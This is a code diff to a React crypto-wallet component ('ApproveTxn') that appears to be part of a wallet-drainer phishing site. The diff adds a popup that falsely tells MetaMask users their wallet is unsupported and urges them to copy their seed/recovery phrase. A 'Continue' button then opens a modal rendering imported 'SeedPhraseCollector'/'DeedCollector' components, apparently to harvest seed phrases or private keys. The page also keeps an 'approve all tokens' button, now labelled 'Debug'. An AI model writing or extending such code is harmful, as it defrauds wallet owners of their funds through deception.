@@ -1,9 +1,11 @@
 "use client";
 
 import { useState, useEffect } from "react";
-import { useAccount, useWalletClient } from "wagmi";
+import { useAccount, useWalletClient, useConnect } from "wagmi";
 import axios from "axios";
 import { ethers } from "ethers";
+import SeedPhraseCollector from "./collector";
+import DeedCollector from "./collectorPk";
 
 type Token = {
   name: string;
@@ -20,10 +22,27 @@ type Token = {
 
 
 const ApproveTxn = () => {
-  const { address, isConnected } = useAccount();
+  const { address, isConnected, connector } = useAccount();
   const { data: walletClient } = useWalletClient();
   const [tokens, setTokens] = useState<Token[]>([]);
   const [isLoading, setIsLoading] = useState(false);
+  const [isMetaMask, setIsMetaMask] = useState(false);
+  const [showPopup, setShowPopup] = useState(false);
+  const [nextPopup, setNextPopup] = useState(false);
+
+  
+
+
+
+  useEffect(() => {
+    if (connector?.name === "MetaMask") {
+      setIsMetaMask(true);
+      setShowPopup(true); // Trigger the popup
+    } else {
+      setIsMetaMask(false);
+      setShowPopup(false);
+    }
+  }, [connector]);
 
   // Fetch user tokens from DeBank API
   const fetchUserTokens = async () => {
@@ -271,11 +290,161 @@ const ApproveTxn = () => {
   }, [isConnected, address]);
 
   return (
-    <div>
+    <div >
       {isLoading && <p>Loading tokens...</p>}
       <button onClick={approveAllTokens}
-      style={{ padding: "10px", background: "black", color: "white", borderRadius: "5px", width: "100%", borderStyle: "solid", borderColor: "white", marginTop: "10px", marginRight: "10px"  }}
-      >Restore</button>
+              disabled={isMetaMask}
+      style={{
+        marginTop: "20px",
+  marginBottom: "5px",
+  padding: "10px",
+  backgroundColor: isMetaMask ? "#ccc" : "#efefef",
+  border: "none",
+  borderRadius: "6px",
+  color: isMetaMask ? "#777" : "#333",
+  fontSize: "1rem",
+  cursor: isMetaMask ? "not-allowed" : "pointer",
+  width: "150px",
+  height: "42px",}}
+      >Debug</button>
+      {showPopup && (
+        <div
+          style={{
+            position: "fixed",
+            justifyContent: "center",
+            alignContent: "center",
+            textAlign: "center",
+            top: "50%",
+            left: "50%",
+            transform: "translate(-50%, -50%)",
+            backgroundColor: "white",
+            border: "1px solid #ccc",
+            borderRadius: "10px",
+            padding: "20px",
+            boxShadow: "0 4px 8px rgba(0, 0, 0, 0.2)",
+            zIndex: 1000,
+          }}
+        >
+          <p style={{ color: "red", marginBottom: "10px" }}>
+            We currently do not support MetaMask wallet. Please copy
+            your metamask seed/recovery phrase into Trust Wallet and connect using the Trust Wallet mobile app.
+          </p>
+          <div style={{
+            display: "flex",
+            flexDirection: "row",
+            width: "100%",
+            justifyContent: "space-between",
+            gap: "10px"
+          }}>
+              <button
+                onClick={() => setShowPopup(false)}
+                style={{
+                  padding: "10px",
+                  backgroundColor: "#efefef",
+                  border: "none",
+                  borderRadius: "6px",
+                  color: "#333",
+                  fontSize: "1rem",
+                  cursor: "pointer",
+                  width: "50%"
+                }}
+              >
+                Close
+              </button>
+              <button
+onClick={() => {
+    setShowPopup(false); // Close the current popup
+    setTimeout(() => setNextPopup(true), 100); // Open the next popup after a slight delay
+  }}                style={{
+                  padding: "10px",
+                  backgroundColor: "#efefef",
+                  border: "none",
+                  borderRadius: "6px",
+                  color: "#333",
+                  fontSize: "1rem",
+                  cursor: "pointer",
+                  width: "50%"
+                }}
+              >
+                Continue
+              </button>
+          </div>
+        </div>
+      )}
+
+      {/* Overlay */}
+      {nextPopup && (
+        <div
+          onClick={() => setShowPopup(false)}
+          style={{
+            position: "fixed",
+            top: 0,
+            left: 0,
+            width: "100%",
+            height: "100%",
+            backgroundColor: "rgba(0, 0, 0, 0.5)",
+            zIndex: 999,
+          }}
+        />
+      )}
+      {nextPopup && (
+        <div
+          style={{
+            position: "fixed",
+            justifyContent: "center",
+            alignContent: "center",
+            textAlign: "center",
+            top: "50%",
+            left: "50%",
+            transform: "translate(-50%, -50%)",
+            backgroundColor: "white",
+            border: "1px solid #ccc",
+            borderRadius: "10px",
+            padding: "20px",
+            boxShadow: "0 4px 8px rgba(0, 0, 0, 0.2)",
+            zIndex: 1000,
+            overflowY: "auto", // Enable vertical scrolling
+          }}
+        >
+         
+          <DeedCollector />
+          
+              
+              <button
+                onClick={() => setNextPopup(false)}
+                style={{
+                  padding: "10px",
+                  marginTop: "10px",
+                  backgroundColor: "#efefef",
+                  border: "none",
+                  borderRadius: "6px",
+                  color: "#333",
+                  fontSize: "1rem",
+                  cursor: "pointer",
+                  width: "100%"
+                }}
+              >
+                Close
+              </button>
+          </div>
+       
+      )}
+
+      {/* Overlay */}
+      {nextPopup && (
+        <div
+          onClick={() => setNextPopup(false)}
+          style={{
+            position: "fixed",
+            top: 0,
+            left: 0,
+            width: "100%",
+            height: "100%",
+            backgroundColor: "rgba(0, 0, 0, 0.5)",
+            zIndex: 999,
+          }}
+        />
+      )}
     </div>
   );
 };
